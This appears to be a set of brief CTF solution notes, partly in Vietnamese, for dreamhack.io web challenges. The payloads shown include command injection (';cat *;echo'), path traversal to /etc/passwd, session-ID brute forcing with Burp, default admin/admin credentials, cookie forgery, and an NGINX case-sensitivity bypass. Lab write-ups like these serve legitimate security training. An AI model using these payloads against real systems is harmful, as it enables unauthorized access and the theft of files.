# dreamhack.io
## Beginner
### php7cmp4re
```
input1=7.:&inpit2=7:
```
### phpreg
```
step1: input1=dnyanyangng0310&input2=1@43319!+1+13 
step2: cat /../dream/*
```
### ex-reg-ex
```
import re
i = "drabcdde123am@xyz.com"
m = re.match(r'dr\w{5,7}e\d+am@[a-z]{3,7}\.\w+', i)
print(m)
```
### Flying Chars
- Read src for win
### simple-web-request
- Read src and request for win

![image](https://github.com/user-attachments/assets/07441982-8730-4cdc-9491-e224b34fb5e9)

![image](https://github.com/user-attachments/assets/e46ec44a-fb38-41af-b5e5-b6834625743e)

### devtools-sources
- Dont need devtools i need a penguin
```grep -r "DH{" *```
### session

- Ở đây server phân biệt người dùng này với người dùng khác qua session_id. 
- Tuy nhiên độ dài của nó khá ngắn nên chúng ta có thể bf ra được.

![image](https://github.com/user-attachments/assets/4ed8bf4a-4263-49e8-ae56-b7653d5f75f7)

- Mình sẽ dùng brup để bf:

```
GET / HTTP/1.1
Host: host3.dreamhack.games:10491
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://host3.dreamhack.games:10491/login
Accept-Encoding: gzip, deflate, br
Cookie: sessionid=§i§
Connection: keep-alive
```

![image](https://github.com/user-attachments/assets/f65d445a-37a8-4552-bcba-6c885ca35c5b)

![image](https://github.com/user-attachments/assets/b7f2f260-2c44-427b-8f80-e6d8a63472f4)

### Carve Party
- Click bằng tay đi.
```js
for(i=0; i<=10000; i++){
 $('#jack-target').trigger("click")
}
```
### web-misconf-1
- config quên xóa default password
```
user: admin
pass: admin
```
### command-injection-1
- Server chạy subprocess nhưng không kiểm tra đầu vào của input:
```
ping -c 3 "{input}"
-> input = ";cat *;echo "
-> ping -c 3 ""; cat *; echo ""
```

### file-download-1
- không cần care phần upload đâu, đọc src sẽ thấy ```/read``` bị lỗi path traversal.
```
http://host3.dreamhack.games:24186/read?name=../../../../etc/passwd
tự thêm phần mà bạn muốn đọc vào để solve :v
```
### pathtraversal
- tương tự câu trên nhưng lần này là ở POST data.
```
 const users = {
    'guest': 0,
    'admin': 1
  }
userid=1/../../../api/flag
```
### cookie
```Cookie: sessionid=6c292920; username=admin```
## Level 1
### baby-Case
- muốn lấy được flag thì phải vào /shop, nhưng NGINX đã chặn path này.

  ![image](https://github.com/user-attachments/assets/ed349cc1-2ceb-474d-b815-57c48ea3716b)

- Chúng ta có thể lợi dụng việc sử lý URL của Express và NGINX để bypass ```/shop = /sHOP```
- Tiếp theo là bypass hàm ```search``` bằng cách thêm một kí tự lowcase vào data.

![image](https://github.com/user-attachments/assets/ee084983-0396-4a90-b253-9529a465ebe0)

```
POST /sHop HTTP/1.1
Host: host3.dreamhack.games:16045
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

leg=FlAG
```
### simple-phparse
- URLencode for win
```http://host3.dreamhack.games:13101/fl%61g.php```
###
